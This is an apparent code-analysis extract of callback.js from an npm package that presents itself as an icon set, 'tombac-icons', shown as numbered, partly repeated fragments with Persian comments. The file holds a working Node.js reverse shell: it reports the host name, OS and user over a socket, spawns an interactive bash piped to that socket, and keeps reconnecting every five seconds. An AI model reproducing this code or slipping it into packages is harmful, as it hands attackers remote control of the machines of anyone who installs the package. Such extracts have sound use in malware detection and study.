// File: tmp/tmpk7gya9rs/tombac-icons/package/callback.js
// ======================================================================
Line 1: const net = require("net")
Line 2: _tmp_7 = require("child_process")
Line 3: const os = require("os")
Line 10: const client = new net.Socket()
Line 12: {
    // پیام خوشامد
    client.write(
      `[*] Reverse shell connected!\n` +
      `[*] Host: ${os.hostname()} (${os.platform()} ${os.release()})\n` +
      `[*] User: ${os.userInfo().username}\n\n`
    );

    // bash -i بهتر از sh معمولی
    const sh = spawn("/bin/bash", ["-i"], {
      stdio: ["pipe", "pipe", "pipe"]
    });

    // ارتباط دو طرفه
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);

    sh.on("exit", () => {
      client.end("[*] Shell exited, reconnecting...\n");
    });

    // اگر کاربر Ctrl+C زد، فقط به شل target بفرست نه اینکه کل برنامه قطع بشه
    client.on("data", (data) => {
      if (data.toString().trim() === "\x03") { // Ctrl+C
        sh.kill("SIGINT");
      }
    });
  }
Line 14: client.write(
      `[*] Reverse shell connected!\n` +
      `[*] Host: ${os.hostname()} (${os.platform()} ${os.release()})\n` +
      `[*] User: ${os.userInfo().username}\n\n`
    )
Line 15: `[*] Reverse shell connected!\n` +
      `[*] Host: ${os.hostname()} (${os.platform()} ${os.release()})\n` +
      `[*] User: ${os.userInfo().username}\n\n`
Line 16: <operator>.formatString("[*] Host: ", os.hostname(), " (", os.platform(), " ", os.release(), ")\n")
Line 17: <operator>.formatString("[*] User: ", os.userInfo().username, "\n\n")
Line 21: const sh = spawn("/bin/bash", ["-i"], {
      stdio: ["pipe", "pipe", "pipe"]
    })
Line 22: _tmp_2.stdio = ["pipe", "pipe", "pipe"]
Line 26: client.pipe(sh.stdin)
Line 27: sh.stdout.pipe(client)
Line 28: sh.stderr.pipe(client)
Line 30: {
      client.end("[*] Shell exited, reconnecting...\n");
    }
Line 31: client.end("[*] Shell exited, reconnecting...\n")
Line 36: data.toString().trim()
Line 37: sh.kill("SIGINT")
Line 42: {
    console.error(`[!] Connection error: ${err.message}`);
    setTimeout(connect, 5000); // تلاش مجدد بعد از 5 ثانیه
  }
Line 43: console.error(`[!] Connection error: ${err.message}`)
Line 44: setTimeout(connect, 5000)
Line 47: {
    console.warn("[!] Disconnected, retrying...");
    setTimeout(connect, 5000);
  }
Line 48: console.warn("[!] Disconnected, retrying...")
Line 49: setTimeout(connect, 5000)
